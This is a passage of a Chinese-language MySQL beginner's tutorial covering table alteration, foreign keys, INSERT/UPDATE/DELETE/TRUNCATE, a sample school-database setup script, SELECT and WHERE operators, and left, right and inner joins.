<li><code>InnoDB</code>：安全性高，事物的处理，多表多用户操作；</li>
</ul>
<h2 id="修改和删除表">2.7. 修改和删除表</h2>
<h3 id="修改">2.7.1. 修改</h3>
<blockquote>
<p>一下操作使用的是上一小节创建的 <code>student</code> 表；</p>
</blockquote>
<p>修改表名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE old_tableName RENAME AS new_tableName;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408154843.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>增加字段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE tableName ADD 字段名 类型 [属性 ...];</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408155002.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>修改表的字段：</p>
<ul>
<li>重命名，使用
<code>change</code>，可以进行字段重命名，新版也可以修改约束；</li>
<li>修改约束，使用 <code>modify</code>，只能够修改约束；</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ALTER TABLE tableName MODIFY 字段名 类型 [属性...]; # 修改约束</span><br><span class="line">2. ALTER TABLE tableName CHANGE 旧字段名 新字段名 类型 [属性...]; # 字段重命名</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408155046.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408155118.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>删除表的字段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE tableName DROP 字段名;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408155144.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h3 id="删除">2.7.2. 删除</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE [IF EXISTS] tableName;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408155219.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>如果表不存在，加了 <code>if exists</code>
只会警告，而不加的会报错。</p>
<h1 id="数据管理">3. 数据管理</h1>
<h2 id="外键">3.1. 外键</h2>
<p>理解：比如一张学生的表，还有一张年级信息的表，那么学生和年级信息都有一个关联那就是学生的年级，那么就可以让学生这张表的年级字段引用年级信息表的相关字段，这样，两张表就通过一个字段关联在一起。</p>
<p>添加外键时，外键必须已经存在。为了演示，先创建一个 <code>grade</code>
表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table `grade`(</span><br><span class="line">`gradeid` int NOT NULL,</span><br><span class="line">`other` varchar(30),</span><br><span class="line">PRIMARY KEY(`gradeid`)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>方式 1：创建表的同时增加约束（复杂）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `student` (</span><br><span class="line">`id` INT(4) NOT NULL AUTO_INCREMENT COMMENT &#x27;学号&#x27;,</span><br><span class="line">`name` VARCHAR(30) NOT NULL DEFAULT &#x27;匿名&#x27; COMMENT &#x27;姓名&#x27;,</span><br><span class="line">`pwd` VARCHAR(20) NOT NULL DEFAULT &#x27;123456&#x27; COMMENT &#x27;密码&#x27;,</span><br><span class="line">`birthday` DATE DEFAULT NULL COMMENT &#x27;生日&#x27;,</span><br><span class="line">`address` VARCHAR(50) DEFAULT NULL COMMENT &#x27;地址&#x27;,</span><br><span class="line">`gradeid` INT NOT NULL COMMENT &#x27;年级&#x27;,</span><br><span class="line">PRIMARY KEY(`id`),</span><br><span class="line">CONSTRAINT `FK_gradeid` FOREIGN KEY(`gradeid`) REFERENCES `grade`(`gradeid`)</span><br><span class="line">)ENGINE=INNODB DEFAULT CHARSET=utf8mb4;</span><br></pre></td></tr></table></figure>
<p>格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONSTRAINT `外键名` FOREIGN KEY(`字段名`) REFERENCES `表名`(`字段名`)</span><br></pre></td></tr></table></figure>
<p>解释：当前表的某个字段引用其他表的某个字段，并为当前表的该字段取一个别名，一般都是
<code>FK_原字段名</code>。</p>
<p>当 <code>student</code> 引用了 <code>grade</code>
之后，就不能直接删除 <code>grade</code> 了，必须先删除
<code>student</code>。</p>
<p>删除外键：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 DROP FOREIGN KEY 外建名；</span><br></pre></td></tr></table></figure>
<p>方式 2：表创建成功后，添加外键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE `表名` ADD CONSTRAINT `外键名` FOREIGN KEY(&#x27;字段名&#x27;) REFERENCES `表名`(`字段名`)</span><br></pre></td></tr></table></figure>
<p>以上操作都是物理外键，数据库级别的外键，不建议使用，避免数据库过多造成困扰。最佳实践：</p>
<ol type="1">
<li>数据库就是单纯的放表，只用来存数据；</li>
<li>如果要使用多张表的数据，或者使用外键，利用程序去实现；</li>
</ol>
<h2 id="dml-语言">3.2. DML 语言</h2>
<p>DML，数据操作语言，Data Manipulation Language。</p>
<p>数据库意义：数据存储、数据管理。</p>
<p>DML 语言：</p>
<ol type="1">
<li><code>insert</code></li>
<li><code>update</code></li>
<li><code>delete</code></li>
</ol>
<h3 id="添加">3.2.1. 添加</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO `表名`(字段1, 字段2, 字段3, ...) </span><br><span class="line">VALUES(值1, 值2, 值 3, ...), (值1, 值2, 值 3, ...), ...;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果主键自增，可以不插入主键的值；</li>
<li>如果不写表的字段，会将 <code>VALUES</code>
中的值与所有字段一一匹配（不建议使用）；</li>
</ul>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408164208.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>可以同时插入多条记录：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408164452.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>不指明表的字段，必须把所有值都写进去，包括主键：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408164717.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h3 id="修改-1">3.2.2. 修改</h3>
<p>格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE `表名` SET `字段1`=新值[, `字段2`=新值, `字段3`=新值, ...] WHERE 条件;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408164948.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>注意：</p>
<ol type="1">
<li>条件可以不写，但不写条件就会把整个表的对应字段的值都做修改。</li>
<li>值可以是一个变量，比如 <code>current_time</code>；</li>
</ol>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408165148.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408165948.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>WHERE 条件子句使用的操作符：</p>
<table>
<thead>
<tr class="header">
<th>操作符</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>=</td>
<td>等于</td>
</tr>
<tr class="even">
<td>&lt;&gt;</td>
<td>不等于</td>
</tr>
<tr class="odd">
<td>!=</td>
<td>不等于</td>
</tr>
<tr class="even">
<td>&gt;</td>
<td>大于</td>
</tr>
<tr class="odd">
<td>&lt;</td>
<td>小于</td>
</tr>
<tr class="even">
<td>&gt;=</td>
<td>大于等于</td>
</tr>
<tr class="odd">
<td>&lt;=</td>
<td>小于等于</td>
</tr>
<tr class="even">
<td>BETWEEN a AND b</td>
<td>闭合区间：<code>[a, b]</code></td>
</tr>
<tr class="odd">
<td>条件_1 AND 条件_2</td>
<td>与</td>
</tr>
<tr class="even">
<td>条件_1 OR 条件_2</td>
<td>或</td>
</tr>
</tbody>
</table>
<h3 id="删除-1">3.2.3. 删除</h3>
<p>删除语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM `表名` WHERE 条件;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408170256.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>注意：</p>
<ol type="1">
<li>条件最好写，否则就会把整个表的内容删除；</li>
</ol>
<p>清空语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TRUNCATE `表名`;</span><br></pre></td></tr></table></figure>
<p><code>TRUNCATE</code> 和 <code>DELETE</code> 的相同、不同点：</p>
<ol type="1">
<li>相同点：都能删除数据，且都不删除表结构；</li>
<li>不同点：
<ol type="1">
<li><code>DELETE</code> 不会影响自增；</li>
<li><code>TRUNCATE</code> 会重置自增；</li>
<li><code>TRUNCATE</code> 不影响事务；</li>
</ol></li>
</ol>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408171036.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>从上图可以知道，使用 <code>DELETE</code>
清空之后，自增没有受到影，而使用 <code>TRUNCATE</code>
清空，自增重置。</p>
<h4 id="delete-删除问题">3.2.3.1. <code>DELETE</code> 删除问题</h4>
<p>使用 <code>DELTE</code> 删除之后，<strong>重启数据库</strong>：</p>
<ul>
<li>InnoDB
自增重置，因为自增是一个计数器，存在内存中，进程结束，内存也就释放；</li>
<li>MyISAM 自增不受影响，存在文件中，不会丢失；</li>
</ul>
<p>重启前（第一张图是 Innodb，第二张图是 MyISAM）：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408171257.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408171435.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>重启后（第一张图是 Innodb，第二张图是 MyISAM）：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408171546.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408171607.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<blockquote>
<p>好像 mysql 8.0 把这个修复了，<code>DELETE</code> 也不会重置自增；</p>
</blockquote>
<h2 id="dql-语言">3.3. DQL 语言</h2>
<p>DQL，数据查询语言，Data Query Language。特点：</p>
<ul>
<li>所有查询操作都需要使用它 <code>select</code>；</li>
<li>数据库中最核心、使用频率最高的语句；</li>
</ul>
<p><code>SELECT</code> 完整语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT [ALL | DISTINCT]</span><br><span class="line">&#123;* | table.* | [table.field1[AS alias1][,table.field2[AS alias2]][...]]&#125;</span><br><span class="line">FROM table_name [AS table_alias]</span><br><span class="line">[LEFT | RIGHT | INNER JOIN table_name2]</span><br><span class="line">[WHERE ...]</span><br><span class="line">[GROUP BY ...]</span><br><span class="line">[HAVING]</span><br><span class="line">[ORDER BY ...]</span><br><span class="line">[LIMIT &#123;[offset, ]row_count | row_countOFFSET offset&#125;];</span><br></pre></td></tr></table></figure>
<h3 id="环境配置">3.3.1. 环境配置</h3>
<p>执行下面语句：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uroot -proot school &lt; school.sql</span><br></pre></td></tr></table></figure>
<p>将下面文件导入到数据库中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database if not exists `school`;  </span><br><span class="line"></span><br><span class="line">-- 创建一个school数据库  </span><br><span class="line">use `school`;</span><br><span class="line"></span><br><span class="line">-- 创建学生表  </span><br><span class="line">drop table if exists `student`;  </span><br><span class="line">create table `student`(  </span><br><span class="line">`studentno` int(4) not null comment &#x27;学号&#x27;,  </span><br><span class="line">`loginpwd` varchar(20) default null,  </span><br><span class="line">`studentname` varchar(20) default null comment &#x27;学生姓名&#x27;,  </span><br><span class="line">`sex` tinyint(1) default null comment &#x27;性别，0或1&#x27;,  </span><br><span class="line">`gradeid` int(11) default null comment &#x27;年级编号&#x27;,  </span><br><span class="line">`phone` varchar(50) not null comment &#x27;联系电话，允许为空&#x27;,  </span><br><span class="line">`address` varchar(255) not null comment &#x27;地址，允许为空&#x27;,  </span><br><span class="line">`borndate` datetime default null comment &#x27;出生时间&#x27;,  </span><br><span class="line">`email` varchar (50) not null comment &#x27;邮箱账号允许为空&#x27;,  </span><br><span class="line">`identitycard` varchar(18) default null comment &#x27;身份证号&#x27;,  </span><br><span class="line">primary key (`studentno`),  </span><br><span class="line">unique key `identitycard`(`identitycard`),  </span><br><span class="line">key `email` (`email`)  </span><br><span class="line">)engine=myisam default charset=utf8;</span><br><span class="line"></span><br><span class="line">-- 创建年级表  </span><br><span class="line">drop table if exists `grade`;  </span><br><span class="line">create table `grade`(  </span><br><span class="line">`gradeid` int(11) not null auto_increment comment &#x27;年级编号&#x27;,  </span><br><span class="line">`gradename` varchar(50) not null comment &#x27;年级名称&#x27;,  </span><br><span class="line">primary key (`gradeid`)  </span><br><span class="line">) engine=innodb auto_increment = 6 default charset = utf8;  </span><br><span class="line">  </span><br><span class="line">-- 创建科目表  </span><br><span class="line">drop table if exists `subject`;  </span><br><span class="line">create table `subject`(  </span><br><span class="line">`subjectno`int(11) not null auto_increment comment &#x27;课程编号&#x27;,  </span><br><span class="line">`subjectname` varchar(50) default null comment &#x27;课程名称&#x27;,  </span><br><span class="line">`classhour` int(4) default null comment &#x27;学时&#x27;,  </span><br><span class="line">`gradeid` int(4) default null comment &#x27;年级编号&#x27;,  </span><br><span class="line">primary key (`subjectno`)  </span><br><span class="line">)engine = innodb auto_increment = 19 default charset = utf8;  </span><br><span class="line">  </span><br><span class="line">-- 创建成绩表  </span><br><span class="line">drop table if exists `result`;  </span><br><span class="line">create table `result`(  </span><br><span class="line">`studentno` int(4) not null comment &#x27;学号&#x27;,  </span><br><span class="line">`subjectno` int(4) not null comment &#x27;课程编号&#x27;,  </span><br><span class="line">`examdate` datetime not null comment &#x27;考试日期&#x27;,  </span><br><span class="line">`studentresult` int (4) not null comment &#x27;考试成绩&#x27;,  </span><br><span class="line">key `subjectno` (`subjectno`)  </span><br><span class="line">)engine = innodb default charset = utf8;</span><br><span class="line"></span><br><span class="line">-- 插入学生数据 其余自行添加 这里只添加了2行  </span><br><span class="line">insert into `student` (`studentno`,`loginpwd`,`studentname`,`sex`,`gradeid`,`phone`,`address`,`borndate`,`email`,`identitycard`)  </span><br><span class="line">values  </span><br><span class="line">(1000,&#x27;123456&#x27;,&#x27;张伟&#x27;,0,2,&#x27;13800001234&#x27;,&#x27;北京朝阳&#x27;,&#x27;1980-1-1&#x27;,&#x27;text123@qq.com&#x27;,&#x27;123456198001011234&#x27;),  </span><br><span class="line">(1001,&#x27;123456&#x27;,&#x27;赵强&#x27;,1,3,&#x27;13800002222&#x27;,&#x27;广东深圳&#x27;,&#x27;1990-1-1&#x27;,&#x27;text111@qq.com&#x27;,&#x27;123456199001011233&#x27;);  </span><br><span class="line">  </span><br><span class="line">-- 插入成绩数据 这里仅插入了一组，其余自行添加  </span><br><span class="line">insert into `result`(`studentno`,`subjectno`,`examdate`,`studentresult`)  </span><br><span class="line">values  </span><br><span class="line">(1000,1,&#x27;2013-11-11 16:00:00&#x27;,85),  </span><br><span class="line">(1000,2,&#x27;2013-11-12 16:00:00&#x27;,70),  </span><br><span class="line">(1000,3,&#x27;2013-11-11 09:00:00&#x27;,68),  </span><br><span class="line">(1000,4,&#x27;2013-11-13 16:00:00&#x27;,98),  </span><br><span class="line">(1000,5,&#x27;2013-11-14 16:00:00&#x27;,58),</span><br><span class="line">(1001,5,&#x27;2013-11-14 16:00:00&#x27;,51),</span><br><span class="line">(1001,1,&#x27;2013-11-11 16:00:00&#x27;,82),</span><br><span class="line">(1001,2,&#x27;2013-11-12 16:00:00&#x27;,79),</span><br><span class="line">(1001,3,&#x27;2013-11-11 09:00:00&#x27;,64),</span><br><span class="line">(1001,4,&#x27;2013-11-13 16:00:00&#x27;,90),</span><br><span class="line">(1001,5,&#x27;2013-11-14 16:00:00&#x27;,50);</span><br><span class="line"></span><br><span class="line">-- 插入年级数据  </span><br><span class="line">insert into `grade` (`gradeid`,`gradename`) values(1,&#x27;大一&#x27;),(2,&#x27;大二&#x27;),(3,&#x27;大三&#x27;),(4,&#x27;大四&#x27;),(5,&#x27;预科班&#x27;);</span><br><span class="line"></span><br><span class="line">-- 插入科目数据</span><br><span class="line">insert into `subject`(`subjectno`,`subjectname`,`classhour`,`gradeid`)values  </span><br><span class="line">(1,&#x27;高等数学-1&#x27;,110,1),  </span><br><span class="line">(2,&#x27;高等数学-2&#x27;,110,2),  </span><br><span class="line">(3,&#x27;高等数学-3&#x27;,100,3),  </span><br><span class="line">(4,&#x27;高等数学-4&#x27;,130,4),  </span><br><span class="line">(5,&#x27;C语言-1&#x27;,110,1),  </span><br><span class="line">(6,&#x27;C语言-2&#x27;,110,2),  </span><br><span class="line">(7,&#x27;C语言-3&#x27;,100,3),  </span><br><span class="line">(8,&#x27;C语言-4&#x27;,130,4),  </span><br><span class="line">(9,&#x27;Java程序设计-1&#x27;,110,1),  </span><br><span class="line">(10,&#x27;Java程序设计-2&#x27;,110,2),  </span><br><span class="line">(11,&#x27;Java程序设计-3&#x27;,100,3),  </span><br><span class="line">(12,&#x27;Java程序设计-4&#x27;,130,4),  </span><br><span class="line">(13,&#x27;数据库结构-1&#x27;,110,1),  </span><br><span class="line">(14,&#x27;数据库结构-2&#x27;,110,2),  </span><br><span class="line">(15,&#x27;数据库结构-3&#x27;,100,3),  </span><br><span class="line">(16,&#x27;数据库结构-4&#x27;,130,4),  </span><br><span class="line">(17,&#x27;C#基础&#x27;,130,1);</span><br></pre></td></tr></table></figure>
<h3 id="查询字段">3.3.2. 查询字段</h3>
<p>格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段 [AS 别名, ...] FROM 表[ AS 表别名]; # 起别名时 as 可以省略</span><br></pre></td></tr></table></figure>
<ul>
<li>如果为字段取了别名，则在该语句中使用该字段时（比如 where
中使用），要使用别名！</li>
<li>如果表起别名，该语句中中使用表名时，也要使用别名（联表查询有这个例子）</li>
</ul>
<p>1、查询指定字段： <code>SELECT 字段1[,字段2,...] FROM 表;</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408202228.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>2、查询全部字段：<code>SELECT * FROM 表;</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408202248.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>3、可以给字段、表起别名：<code>SELECT 字段1 AS 别名1[,字段2 AS 别名2,...] FROM 表 AS 表别名;</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408202408.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>4、函数——拼接字符串：<code>concat(str1, str2)</code>；</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408202447.png" /></p>
<p>5、查询哪些同学参加了考试： 1. 查询 <code>result</code> 表； 2. 去重
<code>DISTINCT</code></p>
<p>去重前后对比：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408202805.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h3 id="查询表达式">3.3.3. 查询表达式</h3>
<p>格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 表达式 FROM 表[ AS 表别名]; # 起别名时 as 可以省略</span><br></pre></td></tr></table></figure>
<p>1、查询 MySQL 版本：<code>SELECT version();</code>（函数）</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408202848.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>2、计算（计算表达式）</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408203244.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>3、查询自增步长 （变量）</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408203302.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>4、学员考试成绩全部加 1：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408203346.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>表达式可以有：文本值、列、NULL、函数、计算表达式、系统变量等；</p>
<h3 id="where-条件子句">3.3.4. WHERE 条件子句</h3>
<p>作用：检索数据中 <strong>符合条件</strong> 的值。</p>
<p>1、逻辑运算符</p>
<table>
<thead>
<tr class="header">
<th>符号</th>
<th>语法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>and 或者 &amp;&amp;</td>
<td>a and b 或者 a &amp;&amp; b</td>
<td>尽量使用 and</td>
</tr>
<tr class="even">
<td>or 或者 ||</td>
<td>a or b 或者 a || b</td>
<td>尽量使用 or</td>
</tr>
<tr class="odd">
<td>not 或者 !</td>
<td>not a 或者 !a</td>
<td>尽量使用 not</td>
</tr>
</tbody>
</table>
<p>查询考试成绩在 80 ~ 100 的成绩 （两种写法）：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408203953.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>查询 1000 号学生之外的成绩 （两种写法）：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408204059.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>2、模糊查询（比较运算符）</p>
<table>
<colgroup>
<col style="width: 14%" />
<col style="width: 23%" />
<col style="width: 61%" />
</colgroup>
<thead>
<tr class="header">
<th>运算符</th>
<th>语法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>IS NULL</td>
<td>a is null</td>
<td>如果 a 为 null，则结果为真，否则为假</td>
</tr>
<tr class="even">
<td>IS NOT NULL</td>
<td>a is not null</td>
<td>如果 a 不为 null，则结果为真，否则为假</td>
</tr>
<tr class="odd">
<td>BETWEEN</td>
<td>c BETWEEN a AND b</td>
<td>若 c 在 <code>[a, b]</code> 之内，则结果为真，否则为假</td>
</tr>
<tr class="even">
<td>LIKE</td>
<td>a like b</td>
<td>SQL 匹配，如果 a 里面有 b，则结果为真，否则为假</td>
</tr>
<tr class="odd">
<td>IN</td>
<td>a in (a, b, c,...)</td>
<td>如果 a 在集合内，则结果为真，否则为假</td>
</tr>
</tbody>
</table>
<blockquote>
<p>LIKE 可以配合 <code>%</code>（任意个字符，包括 0
个），<code>_</code>（一个字符）；</p>
</blockquote>
<p>查找张姓同学：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408204702.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>查找年级 id 在 (1,2,3,4)的信息：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408205238.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h2 id="联表查询">3.4. 联表查询</h2>
<h3 id="主要内容">3.4.1. 主要内容</h3>
<p>总共有如下 7 种 join 查询，使用的语句
<code>JOIN ... ON ...</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/MySQL%E5%85%A5%E9%97%A8_join.jpg"
alt="MySQL入门_join" />
<figcaption aria-hidden="true">MySQL入门_join</figcaption>
</figure>
<blockquote>
<p>本质上只有 3 种，第二行的 3 个。</p>
</blockquote>
<p>为了后面的演示，先在 <code>student</code> 插入一条记录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insert into `student` (`studentno`,`loginpwd`,`studentname`,`sex`,`gradeid`,`phone`,`address`,`borndate`,`email`,`identitycard`)</span><br><span class="line">values(1002,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;张三&#x27;</span>,0,2,<span class="string">&#x27;13803201234&#x27;</span>,<span class="string">&#x27;陕西西安&#x27;</span>,<span class="string">&#x27;1980-2-1&#x27;</span>,<span class="string">&#x27;t123t123@qq.com&#x27;</span>,<span class="string">&#x27;1234561980234&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>联表查询步骤：</p>
<ol type="1">
<li>分析需求，分析查询的字段来自哪些表；</li>
<li>确定使用哪种连接；
<ol type="1">
<li>确定交叉点，使用 <code>ON</code> 来判断；</li>
</ol></li>
</ol>
<p>假设我们需要查询参加了考试的同学的学号、姓名、科目编号以及分数。</p>
<ol type="1">
<li>这些字段来自 <code>student</code> 和 <code>result</code>
两张表；</li>
<li>我们的目的是要参加了考试的同学的信息，所以应该以 <code>result</code>
为主，逻辑应该是“先查询 <code>result</code> 中的所有信息，然后再查询
<code>student</code> 表，如果 <code>student</code> 表中有学号相同的
(交叉点)，则把姓名也作为查询结果”；</li>
</ol>
<p>使用 <code>left join</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select s.studentno, s.studentname, subjectno, studentresult from result r left join student s on s.studentno=r.studentno;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408213907.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>也可以使用
<code>right join</code>，不过两张表的位置要换一下，两者结果一样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select s.studentno, s.studentname, subjectno, studentresult from student s right join result r on s.studentno=r.studentno;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408214011.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>如果使用 <code>right join</code>
而不交换表的位置会出现什么结果呢？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select s.studentno, s.studentname, subjectno, studentresult from result r right join student s on s.studentno=r.studentno;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408214127.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>可以看到，与上面作比较，多了一行
<code>张三</code>。这句查询语句的意思是：</p>
<ul>
<li>先从 <code>student</code>
表中查询所有的学生信息（学号和姓名）；</li>
<li>然后查询 <code>result</code>
表，如果该表中存在学号和上一步中获取的学号相同的记录，则把这些记录的科目编号、分数作为结果返回；</li>
</ul>
<p>注意把两个分析作对比，可以看到两张表在两种分析的环境中的重要程度不同，第一次分析的时候是以
<code>result</code> 表为主，<code>student</code>
表为辅，而第二次分析则正好相反，这就是 <code>left join</code> 和
<code>right join</code> 的区别：</p>
<ol type="1">
<li><code>table1 left join table2</code>：以 <code>table1</code>
为主表，先获取查询结果，然后再查询 <code>table2</code>，如果
<code>table2</code> 中与 <code>table1</code> 有交叉（即 <code>on</code>
后面的条件满足）则把这些记录也作为结果返回；</li>
<li><code>table1 right join table2</code>：以 <code>table2</code>
为主表，先获取查询结果，然后再查询 <code>table1</code>，如果
<code>table1</code> 中与 <code>table2</code> 有交叉（即 <code>on</code>
后面的条件满足）则把这些记录也作为结果返回；</li>
</ol>
<p>理解了这一点之后，再来看一下
<code>inner join</code>，<code>inner join</code> 就没有主表之分了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select s.studentno, s.studentname, subjectno, studentresult from result r inner join student s on s.studentno=r.studentno;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408214848.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>往 <code>result</code> 表插入如下记录后使用 <code>inner join</code>
再次查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into `result`(`studentno`,`subjectno`,`examdate`,`studentresult`)  values(1002,1,&#x27;2013-11-11 16:00:00&#x27;,10);</span><br></pre></td></tr></table></figure>
<figure>
<img
